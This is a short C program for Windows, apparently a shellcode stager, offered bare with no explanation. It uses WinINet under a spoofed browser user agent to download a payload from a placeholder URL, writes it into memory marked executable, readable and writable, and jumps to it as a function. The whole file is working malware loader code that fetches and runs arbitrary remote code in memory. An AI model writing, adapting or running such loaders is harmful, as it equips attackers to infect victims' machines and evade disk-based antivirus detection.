#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

int main()
{
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) return -1;

    HINTERNET hUrl = InternetOpenUrlA(hInternet, "!!!!!!!!!!!!!!ur paylod location url http server or nay location !!!!!!!!!", NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hUrl == NULL) {
        InternetCloseHandle(hInternet);
        return -2;
    }

    // Allocate the full 34.7 MB block of executable memory
    DWORD totalSize = 34759796;
    LPVOID pAddr = VirtualAlloc(NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pAddr == NULL) {
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return -3;
    }

    DWORD bytesRead = 0;
    DWORD totalBytesRead = 0;
    // Cast to an unsigned char pointer so we can perform byte-accurate pointer arithmetic
    unsigned char* pWritePtr = (unsigned char*)pAddr; 

    printf("Downloading payload...\n");

    // LOOP: Keep reading until there are no more bytes left or we hit our limit
    while (InternetReadFile(hUrl, pWritePtr + totalBytesRead, totalSize - totalBytesRead, &bytesRead) && bytesRead > 0) {
        totalBytesRead += bytesRead;
        if (totalBytesRead >= totalSize) {
            break; // Safety break to avoid buffer overflow
        }
    }

    printf("Downloaded %d bytes successfully.\n", totalBytesRead);

    if (totalBytesRead > 0) {
        printf("Executing payload...\n");
        ((void(*)())pAddr)();
    } else {
        printf("Error: No data was downloaded.\n");
    }

    // Clean up resources if execution returns
    VirtualFree(pAddr, 0, MEM_RELEASE);
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    return 0;
}
